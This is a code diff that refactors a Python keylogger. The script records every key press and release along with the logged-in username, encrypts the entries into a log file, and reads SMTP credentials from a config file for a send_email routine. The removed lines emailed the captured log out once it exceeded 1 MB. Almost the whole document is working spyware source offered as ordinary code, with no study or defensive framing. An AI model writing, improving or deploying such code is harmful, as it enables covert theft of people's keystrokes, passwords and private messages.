@@ -2,85 +2,114 @@ import os
 import sys
 import time
 import smtplib
-import cryptography.fernet
+import configparser
+import logging
+from cryptography.fernet import Fernet
 from pynput.keyboard import Key, Listener
-
-# Email configuration
-EMAIL_FROM = "sender@example.com"
-EMAIL_TO = "recipient@example.com"
-EMAIL_PASSWORD = "your-email-password"
-SMTP_SERVER = "smtp.example.com"
-SMTP_PORT = 587
-
-# Log file configuration
-LOG_DIR = ""
-LOG_FILE = "key_log.txt"
-
-# Encryption key
-ENCRYPTION_KEY = b"your-encryption-key"
-
-# Timestamp format
-TIMESTAMP_FORMAT = "%Y-%m-%d %H:%M:%S"
-
-if not os.path.exists(LOG_DIR):
-    os.makedirs(LOG_DIR)
-
-# Create a cipher object for encryption and decryption
-cipher = cryptography.fernet.Fernet(ENCRYPTION_KEY)
-
-def encrypt_data(data):
-    """Encrypt the given data using the encryption key."""
-    return cipher.encrypt(data.encode())
-
-def decrypt_data(data):
-    """Decrypt the given data using the encryption key."""
-    return cipher.decrypt(data).decode()
-
-def send_email(subject, body):
+# Setup logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s'
+)
+logger = logging.getLogger(__name__)
+# Configuration management
+CONFIG_FILE = 'config.ini'
+def load_config():
+    """Load configuration from file."""
+    config = configparser.ConfigParser()
+    try:
+        config.read(CONFIG_FILE)
+        return {
+            'email': {
+                'from': config.get('email', 'from'),
+                'to': config.get('email', 'to'),
+                'password': config.get('email', 'password'),
+                'smtp_server': config.get('email', 'smtp_server'),
+                'smtp_port': config.getint('email', 'smtp_port')
+            },
+            'logging': {
+                'dir': config.get('logging', 'dir'),
+                'file': config.get('logging', 'file')
+            },
+            'encryption': {
+                'key': config.get('encryption', 'key')
+            }
+        }
+    except Exception as e:
+        logger.error(f"Failed to load configuration: {e}")
+        sys.exit(1)
+def setup_directories(log_dir):
+    """Ensure required directories exist."""
+    try:
+        if not os.path.exists(log_dir):
+            os.makedirs(log_dir)
+    except Exception as e:
+        logger.error(f"Failed to create directory {log_dir}: {e}")
+        sys.exit(1)
+def send_email(config, subject, body):
     """Send an email with the given subject and body."""
     try:
-        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
+        server = smtplib.SMTP(
+            config['email']['smtp_server'],
+            config['email']['smtp_port']
+        )
         server.starttls()
-        server.login(EMAIL_FROM, EMAIL_PASSWORD)
-        message = "Subject: {0}\n\n{1}".format(subject, body)
-        server.sendmail(EMAIL_FROM, EMAIL_TO, message)
+        server.login(
+            config['email']['from'],
+            config['email']['password']
+        )
+        message = f"Subject: {subject}\n\n{body}"
+        server.sendmail(
+            config['email']['from'],
+            config['email']['to'],
+            message
+        )
         server.quit()
-        print("Email sent successfully")
+        logger.info("Email sent successfully")
     except Exception as e:
-        print("Failed to send email: {0}".format(str(e)))
-
-def on_press(key):
+        logger.error(f"Failed to send email: {e}")
+def on_press(key, config, cipher):
+    """Handle key press events."""
     try:
-        with open(os.path.join(LOG_DIR, LOG_FILE), "a") as f:
-            timestamp = time.strftime(TIMESTAMP_FORMAT)
-            user = os.getlogin()
-            data = "{0} {1} pressed\n".format(timestamp, key)
-            f.write(decrypt_data(encrypt_data(data)))
+        log_path = os.path.join(config['logging']['dir'], config['logging']['file'])
+        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+        user = os.getlogin()
+        data = f"{timestamp} {user} pressed {key}\n"
+        encrypted_data = cipher.encrypt(data.encode())
+        with open(log_path, 'ab') as f:
+            f.write(encrypted_data + b'\n')
     except Exception as e:
-        print("Failed to write to log file: {0}".format(str(e)))
-
-def on_release(key):
+        logger.error(f"Failed to log key press: {e}")
+def on_release(key, config, cipher):
+    """Handle key release events."""
     try:
-        with open(os.path.join(LOG_DIR, LOG_FILE), "a") as f:
-            timestamp = time.strftime(TIMESTAMP_FORMAT)
-            user = os.getlogin()
-            data = "{0} {1} released\n".format(timestamp, key)
-            f.write(decrypt_data(encrypt_data(data)))
+        log_path = os.path.join(config['logging']['dir'], config['logging']['file'])
+        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+        user = os.getlogin()
+        data = f"{timestamp} {user} released {key}\n"
+        encrypted_data = cipher.encrypt(data.encode())
+        with open(log_path, 'ab') as f:
+            f.write(encrypted_data + b'\n')
+        if key == Key.esc:
+            return False  # Stop listener
     except Exception as e:
-        print("Failed to write to log file: {0}".format(str(e)))
-
-    if key == Key.esc:
-        return False
-
-    # Send an email with the log file as attachment if it exceeds 1 MB
-    log_file_size = os.path.getsize(os.path.join(LOG_DIR, LOG_FILE))
-    if log_file_size > 1e6:
-        with open(os.path.join(LOG_DIR, LOG_FILE), "rb") as f:
-            attachment = f.read()
-        subject = "Key log for {0}".format(user)
-        body = "Please find the attached key log for {0}.".format(user)
-        send_email(subject, body, attachment)
-
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
-
+        logger.error(f"Failed to log key release: {e}")
+def main():
+    """Main application entry point."""
+    try:
+        config = load_config()
+        setup_directories(config['logging']['dir'])
+        cipher = Fernet(config['encryption']['key'].encode())
+        logger.info("Starting keylogger...")
+        with Listener(
+            on_press=lambda key: on_press(key, config, cipher),
+            on_release=lambda key: on_release(key, config, cipher)
+        ) as listener:
+            listener.join()
+    except KeyboardInterrupt:
+        logger.info("Keylogger stopped by user")
+    except Exception as e:
+        logger.error(f"Fatal error: {e}")
+        sys.exit(1)
+if __name__ == "__main__":
+    main()
